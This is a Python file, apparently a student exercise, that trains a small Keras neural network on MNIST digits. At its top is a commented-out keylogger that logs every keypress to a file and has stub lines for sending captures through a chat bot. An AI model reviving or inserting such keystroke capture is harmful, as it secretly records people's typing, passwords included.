# from pynput.keyboard import Listener
# def anonymous(key):
#     key = str(key)
#     key = key.replace("'", "")
#     # bot.sendPhoto(chat_id=id, caption='Thí sinh gian lận')
#     # bot.sendPhoto(chat_id=id, caption=key)
#     if key == "Key.enter":
#         key = "\n"
#     with open("log.txt", "a") as file:
#         file.write(key)
#     print(key)
# with Listener(on_press=anonymous) as hacker:
#     hacker.join()

import tensorflow as tf
from tensorflow.keras.datasets import mnist
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Dropout
from tensorflow.keras.optimizers import RMSprop

# Load dữ liệu MNIST
(x_train, y_train), (x_test, y_test) = mnist.load_data()

# Reshape và chuẩn hóa dữ liệu
x_train = x_train.reshape(60000, 784).astype('float32') / 255
x_test = x_test.reshape(10000, 784).astype('float32') / 255

# Chuyển đổi nhãn thành dạng one-hot encoding
y_train = tf.keras.utils.to_categorical(y_train, 10)
y_test = tf.keras.utils.to_categorical(y_test, 10)

# Xây dựng mô hình neural network
model = Sequential()
model.add(Dense(512, activation='relu', input_shape=(784,)))
model.add(Dropout(0.2))
model.add(Dense(512, activation='relu'))
model.add(Dropout(0.2))
model.add(Dense(10, activation='softmax'))

# Compile mô hình
model.compile(loss='categorical_crossentropy',
              optimizer=RMSprop(),
              metrics=['accuracy'])

# Huấn luyện mô hình
epochs = 10
batch_size = 128
history = model.fit(x_train, y_train,
                    batch_size=batch_size,
                    epochs=epochs,
                    verbose=1,
                    validation_data=(x_test, y_test))

# Đánh giá mô hình
score = model.evaluate(x_test, y_test, verbose=0)
print('Test loss:', score[0])
print('Test accuracy:', score[1])

